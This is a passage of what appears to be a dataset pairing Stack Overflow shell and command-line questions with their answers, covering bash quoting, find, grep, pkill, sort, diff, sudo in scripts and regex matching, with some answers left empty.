necessary.\nPerhaps surprisingly, dash, which also chose to implement the non-POSIX local builtin[2] , does NOT extend assignment logic to it; it is consistent with its export behavior, however.\nAssignments passed to env (e.g., env foo=$bar cmd ...) are also subject to expansion as a command argument and therefore need double-quoting - except in zsh.\nThat env acts differently from export in ksh and bash in that regard is due to the fact that env is an external utility, whereas export is a shell builtin.\n(zsh's behavior fundamentally differs from that of the other shells when it comes to unquoted variable references).\nTilde (~) expansion happens as follows in genuine assignment statements:\nIn addition to the ~ needing to be unquoted, as usual, it is also only applied:\nIf the entire RHS is ~; e.g.:\nfoo=~ # same as: foo=\"$HOME\"\nOtherwise: only if both of the following conditions are met:\nif ~ starts the string or is preceded by an unquoted :\nif ~ is followed by an unquoted /.\ne.g.,\nfoo=~/bin # same as foo=\"$HOME/bin\"\nfoo=$foo:~/bin # same as foo=\"$foo:$HOME/bin\"\nExample\nThis example demonstrates that in bash, ksh, and zsh you can get away without double-quoting, even when using export, but I do not recommend it.\n#!/usr/bin/env bash\n# or ksh or zsh - but NOT /bin/sh!\n\n# Create env. variable with whitespace and other shell metacharacters\nexport FOO=\"b:c &|<> d\"\n\n# Extend the value - the double quotes here are optional, but ONLY \n# because the literal part, 'a:`, contains no whitespace or other shell metacharacters.\n# To be safe, DO double-quote the RHS.\nexport FOO=a:$foo # OK - $FOO now contains 'a:b:c &|<> d'\n[1] As @gniourf_gniourf points out: Use of export to modify the value of PATH is optional, because once a variable is marked as exported, you can use a regular assignment (PATH=...) to change its value.\nThat said, you may still choose to use export, so as to make it explicit that the variable being modified is exported.\n[2] @gniourf_gniourf states that a future version of the POSIX standard may introduce the local builtin.",
    "Run a mySQL query as a cron job?": "",
    "Creating string of repeated characters in shell script [duplicate]": "You can get as many NULL bytes as you want from /dev/zero. You can then turn these into other characters. The following prints 16 lowercase a's\nhead -c 16 < /dev/zero | tr '\\0' '\\141'",
    "How to solve ADB device unauthorized in Android ADB host device?": "",
    "How to kill all processes with the same name using OS X Terminal": "use pkill, with the -f option.\npkill -f python\nIf you don't have pkill pre-installed (some osx's don't...), try proctools.",
    "Running java with JAVA_OPTS env variable has no effect": "You can setup _JAVA_OPTIONS instead of JAVA_OPTS. This should work without $_JAVA_OPTIONS.",
    "Shell script to count files, then remove oldest files": "Try this:\nls -t | sed -e '1,10d' | xargs -d '\\n' rm\nThis should handle all characters (except newlines) in a file name.\nWhat's going on here?\nls -t lists all files in the current directory in decreasing order of modification time. Ie, the most recently modified files are first, one file name per line.\nsed -e '1,10d' deletes the first 10 lines, ie, the 10 newest files. I use this instead of tail because I can never remember whether I need tail -n +10 or tail -n +11.\nxargs -d '\\n' rm collects each input line (without the terminating newline) and passes each line as an argument to rm.\nAs with anything of this sort, please experiment in a safe place.",
    "Extract XML Value in bash script [duplicate]": "As Charles Duffey has stated, XML parsers are best parsed with a proper XML parsing tools. For one time job the following should work.\ngrep -oPm1 \"(?<=<title>)[^<]+\"\nTest:\n$ echo \"$data\"\n<item> \n  <title>15:54:57 - George:</title>\n  <description>Diane DeConn? You saw Diane DeConn!</description> \n</item> \n<item> \n  <title>15:55:17 - Jerry:</title> \n  <description>Something huh?</description>\n$ title=$(grep -oPm1 \"(?<=<title>)[^<]+\" <<< \"$data\")\n$ echo \"$title\"\n15:54:57 - George:",
    "How to attach a file using mail command on Linux? [duplicate]": "Example using uuencode:\nuuencode surfing.jpeg surfing.jpeg | mail sylvia@home.com\nand reference article:\nhttp://www.shelldorado.com/articles/mailattachments.html\nNote:\nyou may apt install sharutils to have uuencode command",
    "Run cURL command every 5 seconds": "You can run in while loop.\nwhile sleep 5; do cmd; done\nEdit:\nIf you don't want to use while..loop. you can use watch command.\nwatch -n 5 cmd",
    "Windows shortcut to run a Git Bash script": "Git bash is already a batch file with content similar to this :\nC:\\WINNT\\system32\\cmd.exe /c \"\"C:\\Git\\bin\\sh.exe\" --login -i\"\nIf you want run (and leave running) a shell script in the context of the shell, specify it at the command line. The trick is that when the script file name is interpreted, it uses the Windows path, not the equivalent path in the sh/Git environment.\nIn other words, to run the file D:\\temp\\test.sh in the Git shell and leave it running, create this batch file :\nC:\\WINNT\\system32\\cmd.exe /c \"\"C:\\Git\\bin\\sh.exe\" --login -i -- D:\\temp\\test.sh\"\nOn the other hand, if you want to run a script and get your shell back, you should :\nOpen the shell as is\nEdit or create ~/.profile (try vi ~/.profile)\nAdd this line : ~/test.sh (ajdust the path if needed)\nSo with a .profile that looks like this :\necho Executing .profile\n/bin/sh ~/test.sh\nAnd test.sh that looks like this :\necho Hello, World!\nYou will get this prompt :\nWelcome to Git (version 1.7.11-preview20120710)\n\n\nRun 'git help git' to display the help index.\nRun 'git help <command>' to display help for specific commands.\nExecuting .profile\nHello, World!\n\nixe013@PARALINT01 ~\n$",
    "How can I write and append using echo command to a file": "If you want to have quotes, then you must escape them using the backslash character.\necho \"I am \\\"Finding\\\" difficult to write this to file\" > file.txt\necho \"I can \\\"write\\\" without double quotes\" >> file.txt\nThe same holds true if you i.e. also want to write the \\ itself, as it may cause side effects. So you have to use \\\\\nAnother option would be to use The `'' instead of quotes.\necho 'I am \"Finding\" difficult to write this to file' > file.txt\necho 'I can \"write\" without double quotes' >> file.txt\nHowever in this case variable substition doesn't work, so if you want to use variables you have to put them outside.\necho \"This is a test to write $PATH in my file\" >> file.txt\necho 'This is a test to write '\"$PATH\"' in my file' >> file.txt",
    "Use GNU find to show only the leaf directories": "You can use -links if your filesystem is POSIX compliant (i.e. a directory has a link for each subdirectory in it, a link from its parent and a link to itself, thus a count of 2 links if it has no subdirectories).\nThe following command should do what you want:\nfind dir -type d -links 2\nHowever, it does not seems to work on Mac OS X (as @Piotr mentioned). Here is another version that is slower, but does work on Mac OS X. It is based on his version, with a correction to handle whitespace in directory names:\nfind . -type d -exec sh -c '(ls -p \"{}\"|grep />/dev/null)||echo \"{}\"' \\;",
    "CLOC ignore/exclude list file (.clocignore)": "The best workaround I've found is to feed the contents of .clocignore directly to --exclude-dir. For example, if you are using bash and have tr available:\ncloc --exclude-dir=$(tr '\\n' ',' < .clocignore) .",
    "How to override the path of PHP to use the MAMP path?": "",
    "How to change RGB colors in Git Bash for windows?": "This works for me to change the text colors used by Git Bash on Windows 7:\nClick on the upper left corner of an open Git Bash window (the Git icon in the window frame).\nA menu appears (the same that would appear with a regular DOS cmd Window). Choose the last entry: \"Properties\", UPDATE 2021: \"Options...\" (thanks AlexD!)\nGo to tab \"Colors\"\nChoose radio button \"Screen Text\"\nRemember which color is currently assigned to \"Screen Text\" in the row of small color boxes (it has a black frame).\nThen select the color you want to change by clicking on the corresponding color box. This color is now assigned as \"Screen Text\", which is what Git Bash uses for regular text. But don't worry, this change is only temporary and needed to modify the value of a color.\nNow change the Red/Green/Blue values for the selected color. In my case I wanted to make the fifth color from the left (much) brighter. Let's call it \"Color 5\". This is the color Git Bash uses to show changed files with \"git status\". Whenever Git Bash wants to use \"Color 5\" it will use the new RGB value.\n\"Screen Text\" is now still set to \"Color 5\". So click on the original color that you have remembered.\nThe changes made in this way are permanent but only valid for the shortcut you have used to start Git Bash. If you create a new shortcut you are back to the original colors.",
    "The return code from 'grep' is not as expected on Linux": "According to man grep page, -c flag is for\n-c, --count Suppress normal output; instead print a count of matching lines for each input file.\nSo what you are seeing is the count of the match and not to be confused with the exit code of the grep match. The code 1 is because of no lines matching from the input.\nHave a look at the other case,\necho 'No' | grep -c No\n1\n\necho $?\n0\nAlso to read on EXIT CODES on man grep page,\nEXIT STATUS Normally the exit status is 0 if a line is selected, 1 if no lines were selected, and 2 if an error occurred.",
    "How to run a script as root in Jenkins?": "",
    "How can I pass variables from awk to a shell command?": "you are close. you have to concatenate the command line with awk variables:\nawk '{system(\"wc \"$1)}' myfile",
    "How to send list of file in a folder to a txt file in Linux": "you can just use\nls > filenames.txt\n(usually, start a shell by using \"Terminal\", or \"shell\", or \"Bash\".) You may need to use cd to go to that folder first, or you can ls ~/docs > filenames.txt",
    "How to Pass parameters for a Ant script , which is invoked via shell script?": "Do you mean assigning value to a property from command line? If so, try\n-DpropertyName=itsValue\nFor example,\n<project>\n    <target name=\"hi\">\n        <property name=\"person\" value=\"world\"/>\n        <echo message=\"Hello ${person}\"/>\n    </target>\n</project>\nand then\nant -Dperson=\"MerryPrankster\" hi\nyields\n [echo] Hello MerryPrankster",
    "How would you launch a browser from the a node.js command line script [duplicate]": "Open exists now, use that. :)\nInstall with:\n$ npm install --save open\nUse with:\nconst open = require('open');\n\n// Opens the image in the default image viewer\n(async () => {\n    await open('unicorn.png', {wait: true});\n    console.log('The image viewer app closed');\n\n    // Opens the url in the default browser\n    await open('https://sindresorhus.com');\n\n    // Specify the app to open in\n    await open('https://sindresorhus.com', {app: 'firefox'});\n\n    // Specify app arguments\n    await open('https://sindresorhus.com', {app: ['google chrome', '--incognito']});\n})();\nThe app: ... option:\nType: string | string[]\nSpecify the app to open the target with, or an array with the app and app arguments.\nThe app name is platform dependent. Don't hard code it in reusable modules. For example, Chrome is google chrome on macOS, google-chrome on Linux and chrome on Windows.\nYou may also pass in the app's full path. For example on WSL, this can be /mnt/c/Program Files (x86)/Google/Chrome/Application/chrome.exe for the Windows installation of Chrome.\nExample:\nopen('http://localhost', {app: \"C:\\\\Program Files (x86)\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\"});",
    "How to run a series of vim commands from command prompt": "vim -c <command> Execute <command> after loading the first file\nDoes what you describe, but you'll have to do it one file at a time.\nSo, in a windows shell...\nfor %a in (A,B,C,D) do vim -c \":g/^\\s*$/d\" -c \"<another command>\" %a.txt\nPOSIX shells are similar, but I don't have a machine in front of me at the moment.\nI imagine you could load all the files at once and do it, but it would require repeating the commands on the vim command line for each file, similar to\nvim -c \"<command>\" -c \"<command>\" -c \":n\" (repeat the previous -c commands for each file.)  <filenames go here>\nEDIT: June 08 2014: Just an FYI, I discovered this a few minutes ago.\nvim has the command bufdo to do things to each buffer (file) loaded in the editor. Look at the docs for the bufdo command. In vim, :help bufdo",
    "How to programmatically determine whether the Git checkout is a tag and if so, what is the tag name": "The solution to your question is to use\ngit describe --exact-match HEAD\n(which would consider only annotated tags, but you should use annotated and probably even signed tags for tagging releases).\nIf you want to consider all tags, also lightweight tags (which are usually used for local tagging), you can use --tags option:\ngit describe --exact-match --tags HEAD\nBut I think you have \"XY problem\" here, in that you are asking question about possible solution to the problem, rather than asking question about a problem... which can have better solution.\nThe solution to your problem is to take a look how Git does it in GIT-VERSION-GEN script, and how it uses it in its Makefile.",
    "How do I escape a string for a shell command in node?": "You should never rely on escaping unknown input going to a shell parameter - there will almost always be some edge-case that you haven't thought of that allows the user to execute arbitrary code on your server.\nNode has support for calling a command and passing each argument separately, with no escaping required. This is the safest way to do it:\nconst { spawn } = require('child_process');\n// Note that the arguments are in an array, not using string interpolation\nconst ls = spawn('ls', ['-lh', '/usr']);\n\nls.stdout.on('data', (data) => {\n  console.log(`stdout: ${data}`);\n});\n\nls.stderr.on('data', (data) => {\n  console.log(`stderr: ${data}`);\n});\n\nls.on('close', (code) => {\n  console.log(`child process exited with code ${code}`);\n});\nThe documentation is here",
    "Linux shell script to add leading zeros to file names": "Try:\nfor a in [0-9]*.txt; do\n    mv $a `printf %04d.%s ${a%.*} ${a##*.}`\ndone\nChange the filename pattern ([0-9]*.txt) as necessary.\nA general-purpose enumerated rename that makes no assumptions about the initial set of filenames:\nX=1;\nfor i in *.txt; do\n  mv $i $(printf %04d.%s ${X%.*} ${i##*.})\n  let X=\"$X+1\"\ndone\nOn the same topic:\nBash script to pad file names\nExtract filename and extension in bash",
    "What does the `2>` mean on the Unix command-line?": "File descriptor 2 represents standard error. (other special file descriptors include 0 for standard input and 1 for standard output).\n2> /dev/null means to redirect standard error to /dev/null. /dev/null is a special device that discards everything that is written to it.\nPutting all together, this line of code stores the standard output of command ls $directory_/fallback_* 2> /dev/null into the variable scriptlist, and the standard error is discarded.",
    "Use sudo without password INSIDE a script": "From my blog: IDMRockstar.com:\nThe kicker is that sometimes, I need to run commands as root. Here's the quick and dirty way I accomplish that without divulging the passwords:\n#! /bin/bash\nread -s -p \"Enter Password for sudo: \" sudoPW\necho $sudoPW | sudo -S yum update\nThis way the user is prompted for the password (and hidden from terminal) and then passed into commands as needed, so I'm not running the entire script as root =)\nIf you have a better, way, I'd love to hear it! I'm not a shell scripting expert by any means.",
    "What Linux shell should I use? [closed]": "The most common shell, by far, on Linux is bash. Unless you have a good reason to use an alternative, I'd suggest that sticking with bash, or the most commonly used shell by your project team (or that the bulk of the shell scripts you have to work with) uses.\nThe only other very common contender is dash, which is becoming more widely used by the Ubuntu project.\nThis really is personal preference, well, except for csh.\nWikipedia link for csh",
    "Have Find print just the filenames, not full paths": "If you're using GNU find, then\nfind path -printf \"%f\\n\"\nwill just print the file name and exclude the path.",
    "Recursively List all directories and files": "In windows, to list only directories:\ndir /ad /b /s\nto list all files (and no directories):\ndir /a-d /b /s\nredirect the output to a file:\ndir /a-d /b /s > filename.txt\ndir command parameters explained on wikipedia",
    "Bash variable assignment and command not found [duplicate]": "Try this (notice I have removed the spaces from either side of the =):\n#!/bin/bash\nJ=\"4\"\nFACE_NAME=\"eig$J.face\"\nUSER_DB_NAME=\"base$J.user\"\nBash doesn't like spaces when you declare variables - also it is best to make every value quoted (but this isn't as essential).",
    "Forking / Multi-Threaded Processes | Bash": "In bash scripts (non-interactive) by default JOB CONTROL is disabled so you can't do the the commands: job, fg, and bg.\nHere is what works well for me:\n#!/bin/sh\n\nset -m # Enable Job Control\n\nfor i in `seq 30`; do # start 30 jobs in parallel\n  sleep 3 &\ndone\n\n# Wait for all parallel jobs to finish\nwhile [ 1 ]; do fg 2> /dev/null; [ $? == 1 ] && break; done\nThe last line uses \"fg\" to bring a background job into the foreground. It does this in a loop until fg returns 1 ($? == 1), which it does when there are no longer any more background jobs.",
    "Add a bash script to path": "Try this:\nSave the script as apt-proxy (without the .sh extension) in some directory, like ~/bin.\nAdd ~/bin to your PATH, typing export PATH=$PATH:~/bin\nIf you need it permanently, add that last line in your ~/.bashrc. If you're using zsh, then add it to ~/.zshrc instead.\nThen you can just run apt-proxy with your arguments and it will run anywhere.\nNote that if you export the PATH variable in a specific window it won't update in other bash instances.",
    "Adding/Subtracting days to ISODate in MongoDB Shell": "This has been answered on Query to get last X minutes data with Mongodb\nquery = {\n    timestamp: { // 18 minutes ago (from now)\n        $gt: new Date(ISODate().getTime() - 1000 * 60 * 18)\n    }\n}\nAnd in your case, for a number of days:\n\"StartDate\" : { \"$gte\" : new Date(ISODate().getTime() - 1000 * 3600 * 24 * 3) }\nor\n\"StartDate\" : { \"$gte\" : new Date(ISODate().getTime() - 1000 * 86400 * 3) }\n(here the 3 is your number of days)",
    "sh command: exec 2>&1": "Technically speaking it duplicates, or copies, stderr onto stdout.\nUsually you don't need the exec to perform this. A more typical use of exec with file descriptors is to indicate that you want to assign a file to an unused file descriptor, e.g.\nexec 35< my_input\nBTW Don't forget that the sequence of declaration when piping to a file is important, so\nls > mydirlist 2>&1\nwill work because it directs both stdout and stderr to the file mydirlist, whereas the command\nls 2>&1 > mydirlist\ndirects only stdout, and not stderr, to file mydirlist, because stderr was made a copy of stdout before stdout was redirected to mydirlist.\nEdit: It's the way that the shell works scanning from left to right. So read the second one as saying \"copy stderr onto stdout\" before it says \"send stdout to mydirlist\". Then read the first one as saying \"send stdout to the file mydirlist\" before it says \"duplicate stderr onto that stdout I've set up\". I know. It's totally not intuitive!",
    "How to delete a whole word after the cursor in a Bash-like command-line tool? [duplicate]": "Use Esc + D or Alt + D to delete the word on the right.",
    "Do manual build fail in Jenkins using shell script": "",
    "Capturing stdout when calling Runtime.exec": "You need to capture both the std out and std err in the process. You can then write std out to a file/mail or similar.\nSee this article for more info, and in particular note the StreamGobbler mechanism that captures stdout/err in separate threads. This is essential to prevent blocking and is the source of numerous errors if you don't do it properly!",
    "How to replace one character with two characters using tr": "No, tr is specifically intended to replace single characters by single characters (or, depending on command-line options, to delete characters or replace runs of a single character by one occurrence.).\nsed is probably the best tool for this particular job:\n$ echo \"asdlksad ~ adlkajsd ~ 12345\" | sed 's/~/~\\n/g'\nasdlksad ~\n adlkajsd ~\n 12345\n(Note that this requires sed to interpret the backlash-n \\n sequence as a newline character. GNU sed does this, but POSIX doesn't specify it except within a regular expression, and there are definitely older versions of sed that don't.)",
    "Close Terminal window from within shell script (Unix)?": "Using exit 0 will cleanly terminate the script.\nWhether Terminal window stays open is user-configurable. The default is to always stay open. To change this:\nTerminal.app > Preferences > Profiles > Shell\n    - \"When the shell exists:\"\n        > Close if the shell exited cleanly\n    - \"Ask before closing:\"\n        (\u2022) Never\n        -- OR --\n        (\u2022) Only if there are....\nWhen \"Close if shell exited cleanly\" is used, the script will close the window if the exit result is 0, which is the default if nothing went wrong.",
    "Sort & uniq in Linux shell": "Using sort -u does less I/O than sort | uniq, but the end result is the same. In particular, if the file is big enough that sort has to create intermediate files, there's a decent chance that sort -u will use slightly fewer or slightly smaller intermediate files as it could eliminate duplicates as it is sorting each set. If the data is highly duplicative, this could be beneficial; if there are few duplicates in fact, it won't make much difference (definitely a second order performance effect, compared to the first order effect of the pipe).\nNote that there times when the piping is appropriate. For example:\nsort FILE | uniq -c | sort -n\nThis sorts the file into order of the number of occurrences of each line in the file, with the most repeated lines appearing last. (It wouldn't surprise me to find that this combination, which is idiomatic for Unix or POSIX, can be squished into one complex 'sort' command with GNU sort.)\nThere are times when not using the pipe is important. For example:\nsort -u -o FILE FILE\nThis sorts the file 'in situ'; that is, the output file is specified by -o FILE, and this operation is guaranteed safe (the file is read before being overwritten for output).",
    "Simple file server to serve current directory [closed]": "python3 -m http.server\nor if you don't want to use the default port 8000\npython3 -m http.server 3333\nor if you want to allow connections from localhost only\npython3 -m http.server --bind 127.0.0.1\nSee the docs.\nThe equivalent Python 2 commands are\npython -m SimpleHTTPServer\n\npython -m SimpleHTTPServer 3333\nThere is no --bind option.\nSee the Python 2 docs.",
    "How to count differences between two files on linux?": "If you want to count the number of lines that are different use this:\ndiff -U 0 file1 file2 | grep ^@ | wc -l\nDoesn't John's answer double count the different lines?",
    "What is the reason for the weird syntax of the \"case\" statement in a bash/zsh script?": "Per request:\nSo can you guess why a loop is 'for ...; do ...; done' and not 'for ...; do ...; od'? There was a sound reason for it - but the Algol-like reversed keyword to mark the end was used elsewhere.\nAnswer:\nThe syntax came from Bourne (of Bourne shell fame). He had worked on Algol, and liked it enough to model some of the shell syntax on Algol. Algol uses reversed keywords to mark the ends of constructs, so 'case ... esac' was appropriate. The reason that loops do not end with 'od' is that there was already a command 'od' in Unix - octal dump. So, 'done' is used instead.\nBy reputation, the Bourne shell source code was written in idiosyncratic C with macros to make it look like Algol. This made it hard to maintain.\nWith respect to the main question - about why no opening bracket (parenthesis) around the alternatives in the case statement - I have a couple of related theories.\nFirst of all, back when the Bourne shell was written (late 1970s), much editing was done with 'ed', the standard text editor. It has no concept of skipping to a balanced parenthesis or other such notations, so there was no requirement for a leading parenthesis. Also, if you are writing a document, you might well marshal your arguments with:\na) ...blah...\nb) ...more...\nc) ...again...\nThe opening parenthesis is often omitted - and the case statement would fit into that model quite happily.\nOf course, since then, we have grown used to editors that mark the matching open parenthesis when you type a close parenthesis, so the old Bourne shell notation is a nuisance. The POSIX standard makes the leading parenthesis optional; most more modern implementations of POSIX-like shells (Korn, Bash, Zsh) will support that, and I generally use it when I don't have to worry about portability to machines like Solaris 10 where /bin/sh is still a faithful Bourne shell that does not allow the leading parenthesis. (I usually deal with that by using #!/bin/ksh as the shebang.)",
    "What does double slash // in `cd //` mean in Linux? [duplicate]": "Actually it means nothing and is ignored.\nFrom the Bash FAQ E10::\nE10) Why does 'cd //' leave $PWD as '//'?\nPOSIX.2, in its description of 'cd', says that three or more leading slashes may be replaced with a single slash when canonicalizing the current working directory.\nThis is, I presume, for historical compatibility. Certain versions of Unix, and early network file systems, used paths of the form //hostname/path to access 'path' on server 'hostname'.\nAlso the Unix standards states:\nA pathname that begins with two successive slashes may be interpreted in an implementation-defined manner, although more than two leading slashes shall be treated as a single slash.",
    "How can I return to the previous working directory quickly in Bash?": "You can go back to the last dir with cd -",
    "How to enable color for PHP CLI?": "",
    "How to check if another instance of my shell script is running": "An easier way to check for a process already executing is the pidof command.\nif pidof -x \"abc.sh\" >/dev/null; then\n    echo \"Process already running\"\nfi\nAlternatively, have your script create a PID file when it executes. It's then a simple exercise of checking for the presence of the PID file to determine if the process is already running.\n#!/bin/bash\n# abc.sh\n\nmypidfile=/var/run/abc.sh.pid\n\n# Could add check for existence of mypidfile here if interlock is\n# needed in the shell script itself.\n\n# Ensure PID file is removed on program exit.\ntrap \"rm -f -- '$mypidfile'\" EXIT\n\n# Create a file with current PID to indicate that process is running.\necho $$ > \"$mypidfile\"\n\n...\nUpdate: The question has now changed to check from the script itself. In this case, we would expect to always see at least one abc.sh running. If there is more than one abc.sh, then we know that process is still running. I'd still suggest use of the pidof command which would return 2 PIDs if the process was already running. You could use grep to filter out the current PID, loop in the shell or even revert to just counting PIDs with wc to detect multiple processes.\nHere's an example:\n#!/bin/bash\n\nfor pid in $(pidof -x abc.sh); do\n    if [ $pid != $$ ]; then\n        echo \"[$(date)] : abc.sh : Process is already running with PID $pid\"\n        exit 1\n    fi\ndone",
    "How to remove carriage return from a variable in shell script": "yet another solution uses tr:\necho $testVar | tr -d '\\r'\ncat myscript | tr -d '\\r'\nthe option -d stands for delete.",
    "Permission denied at hdfs": "I solved this problem temporary by disabling the dfs permission.By adding below property code to conf/hdfs-site.xml\n<property>\n  <name>dfs.permissions</name>\n  <value>false</value>\n</property>",
    "ANSI Coloring in Compilation Mode": "There's already a function for applying color to comint buffers. You simply need to enable it on compilation buffers:\n(require 'ansi-color)\n(defun colorize-compilation-buffer ()\n  (toggle-read-only)\n  (ansi-color-apply-on-region compilation-filter-start (point))\n  (toggle-read-only))\n(add-hook 'compilation-filter-hook 'colorize-compilation-buffer)\nColor writing programs should check the TERM environment variable and the terminfo database to check if the terminal supports color. In practice, a lot of programs ignore this and rely on a user setting. Emacs will set the compilation terminal type to dumb by default but this can be overriden by setting the compilation-environment variable.\nUpdate: Note that in Emacs 24.5 the two calls to (toggle-read-only) in the code above are not needed.",
    "linux wildcard usage in cp and mv": "The find command can be used quite concisely in simple cases where you want to perform operations on wildcard (or more complex) filename matches. The technique below can be committed to memory ... almost !\nThis works by letting the find command run another command on each filename it finds. You can dry-run this example using echo instead of/in front of mv .\nIf we wanted to move all files in the current directory with name beginning 'report', to another parallel directory called 'reports' :\nfind . -name \"report*.*\" -exec mv '{}' ../reports/ \\;\nThe wildcard string must be in quotes, the {} marking the filename that was 'found' must be in quotes, and the final semicolon must be escaped - all due to Bash/shell treatment of those characters.\nLook at the man page for find for more uses: https://linux.die.net/man/1/find",
    "What version of MongoDB is installed on Ubuntu": "inside shell:\n$ mongod --version",
    "Shell Scripting: Using a variable to define a path": "Don't use spaces...\n(Incorrect)\nSPTH = '/home/Foo/Documents/Programs/ShellScripts/Butler'\n(Correct)\nSPTH='/home/Foo/Documents/Programs/ShellScripts/Butler'",
    "An easy way to diff log files, ignoring the time stamps?": "Depending on the shell you are using, you can turn the approach @Blair suggested into a 1-liner\ndiff <(cut -b13- file1) <(cut -b13- file2)\n(+1 to @Blair for the original suggestion :-)",
    "Convert string to date in bash": "This worked for me :\ndate -d '20121212 7 days'\ndate -d '12-DEC-2012 7 days'\ndate -d '2012-12-12 7 days'\ndate -d '2012-12-12 4:10:10PM 7 days'\ndate -d '2012-12-12 16:10:55 7 days'\nthen you can format output adding parameter '+%Y%m%d'",
    "execute shell command from android": "",
    "Recursively read folders and executes command on each of them": "If you want to recurse into directories, executing a command on each file found in those, I would use the find command, instead of writing anything using shell-script, I think.\nThat command can receive lots of parameters, like type to filter the types of files returned, or exec to execute a command on each result.\n\nFor instance, to find directories that are under the one I'm currently in :\nfind . -type d -exec echo \"Hello, '{}'\" \\;\nWhich will get me somehthing like :\nHello, '.'\nHello, './.libs'\nHello, './include'\nHello, './autom4te.cache'\nHello, './build'\nHello, './modules'\n\nSame to find the files under the current directory :\nfind . -type f -exec echo \"Hello, '{}'\" \\;\nwhich will get me something like this :\nHello, './config.guess'\nHello, './config.sub'\nHello, './.libs/memcache_session.o'\nHello, './.libs/memcache_standard_hash.o'\nHello, './.libs/memcache_consistent_hash.o'\nHello, './.libs/memcache.so'\nHello, './.libs/memcache.lai'\nHello, './.libs/memcache.o'\nHello, './.libs/memcache_queue.o'\nHello, './install-sh'\nHello, './config.h.in'\nHello, './php_memcache.h'\n...\n\nSome would say \"it's not shell\"... But why re-invent the wheel ?\n(And, in a way, it is shell ^^ )\n\nFor more informations, you can take a look at :\nman find\nlots of tutorials found with google, like, for instance, Unix Find Command Tutorial",
    "How to pass a variable in a curl command in shell scripting": "When using variables in\nshell\n, you can only use doubles quotes, not single quotes : the variables inside single quotes are not expanded. Learn the difference between ' and \" and `. See http://mywiki.wooledge.org/Quotes and https://web.archive.org/web/20230314111401/https://wiki.bash-hackers.org/syntax/words",
    "Command to list all files except . (dot) and .. (dot dot)": "Regarding the ls(1) documentation (man ls):\n-A, --almost-all do not list implied . and ..\nyou need (without any additional argument such as .*):\nls -A\nor better yet:\n/bin/ls -A",
    "How to print UTF-8 encoded text to the console in Python < 3?": "It seems accomplishing this is not recommended.\nFedora suggested using the system locale as the default, but apparently this breaks other things.\nHere's a quote from the mailing-list discussion:\nThe only supported default encodings in Python are:\n\n Python 2.x: ASCII\n Python 3.x: UTF-8\n\nIf you change these, you are on your own and strange things will\nstart to happen. The default encoding does not only affect\nthe translation between Python and the outside world, but also\nall internal conversions between 8-bit strings and Unicode.\n\nHacks like what's happening in the pango module (setting the\ndefault encoding to 'utf-8' by reloading the site module in\norder to get the sys.setdefaultencoding() API back) are just\ndownright wrong and will cause serious problems since Unicode\nobjects cache their default encoded representation.\n\nPlease don't enable the use of a locale based default encoding.\n\nIf all you want to achieve is getting the encodings of\nstdout and stdin correctly setup for pipes, you should\ninstead change the .encoding attribute of those (only).\n\n-- \nMarc-Andre Lemburg\neGenix.com",
    "Why doesn't my terminal output unicode characters properly?": "I figured it out. I had to make sure I set LANGUAGE=\"en_US.UTF-8\" in /etc/rc.conf and LANG=\"en_US.UTF-8\" in /etc/locale.conf, then logged out and logged back in and it worked. My terminal displays unicode properly now.",
    "check if file exists on remote host with ssh": "In addition to the answers above, there's the shorthand way to do it:\nssh -q $HOST [[ -f $FILE_PATH ]] && echo \"File exists\" || echo \"File does not exist\";\n-q is quiet mode, it will suppress warnings and messages.\nAs @Mat mentioned, one advantage of testing like this is that you can easily swap out the -f for any test operator you like: -nt, -d, -s etc...\nTest Operators: http://tldp.org/LDP/abs/html/fto.html",
    "How to get grand total filesize of all files matching a filename pattern in the shell?": "Try:\nfind . -name \"*.undo\" -ls | awk '{total += $7} END {print total}'\nOn my system the size of the file is the seventh field in the find -ls output. If your find \u2026 -ls output is different, adjust.\nIn this version, using the existing directory information (file size) and the built-in ls feature of find should be efficient, avoiding process creations or file i/o.",
    "Shell Script, read on same line after echoing a message": "Solution: read -p \"Enter [y/n] : \" opt\nFrom help read:\n  -p prompt output the string PROMPT without a trailing newline before\n        attempting to read",
    "diff command to get number of different lines only": "diff can do all the first part of the job but no counting; wc -l does the rest:\ndiff -y --suppress-common-lines file1 file2 | wc -l",
    "How do I extract a string using a regex in a shell script?": "Using bash regular expressions:\nre=\"http://([^/]+)/\"\nif [[ $name =~ $re ]]; then echo ${BASH_REMATCH[1]}; fi\nEdit - OP asked for explanation of syntax. Regular expression syntax is a large topic which I can't explain in full here, but I will attempt to explain enough to understand the example.\nre=\"http://([^/]+)/\"\nThis is the regular expression stored in a bash variable, re - i.e. what you want your input string to match, and hopefully extract a substring. Breaking it down:\nhttp:// is just a string - the input string must contain this substring for the regular expression to match\n[] Normally square brackets are used say \"match any character within the brackets\". So c[ao]t would match both \"cat\" and \"cot\". The ^ character within the [] modifies this to say \"match any character except those within the square brackets. So in this case [^/] will match any character apart from \"/\".\nThe square bracket expression will only match one character. Adding a + to the end of it says \"match 1 or more of the preceding sub-expression\". So [^/]+ matches 1 or more of the set of all characters, excluding \"/\".\nPutting () parentheses around a subexpression says that you want to save whatever matched that subexpression for later processing. If the language you are using supports this, it will provide some mechanism to retrieve these submatches. For bash, it is the BASH_REMATCH array.\nFinally we do an exact match on \"/\" to make sure we match all the way to end of the fully qualified domain name and the following \"/\"\nNext, we have to test the input string against the regular expression to see if it matches. We can use a bash conditional to do that:\nif [[ $name =~ $re ]]; then\n    echo ${BASH_REMATCH[1]}\nfi\nIn bash, the [[ ]] specify an extended conditional test, and may contain the =~ bash regular expression operator. In this case we test whether the input string $name matches the regular expression $re. If it does match, then due to the construction of the regular expression, we are guaranteed that we will have a submatch (from the parentheses ()), and we can access it using the BASH_REMATCH array:\nElement 0 of this array ${BASH_REMATCH[0]} will be the entire string matched by the regular expression, i.e. \"http://www.google.com/\".\nSubsequent elements of this array will be subsequent results of submatches. Note you can have multiple submatch () within a regular expression - The BASH_REMATCH elements will correspond to these in order. So in this case ${BASH_REMATCH[1]} will contain \"www.google.com\", which I think is the string you want.\nNote that the contents of the BASH_REMATCH array only apply to the last time the regular expression =~ operator was used. So if you go on to do more regular expression matches, you must save the contents you need from this array each time.\nThis may seem like a lengthy description, but I have really glossed over several of the intricacies of regular expressions. They can be quite powerful, and I believe with decent performance, but the regular expression syntax is complex. Also regular expression implementations vary, so different languages will support different features and may have subtle differences in syntax. In particular escaping of characters within a regular expression can be a thorny issue, especially when those characters would have an otherwise different meaning in the given language.\nNote that instead of setting the $re variable on a separate line and referring to this variable in the condition, you can put the regular expression directly into the condition. However in bash 3.2, the rules were changed regarding whether quotes around such literal 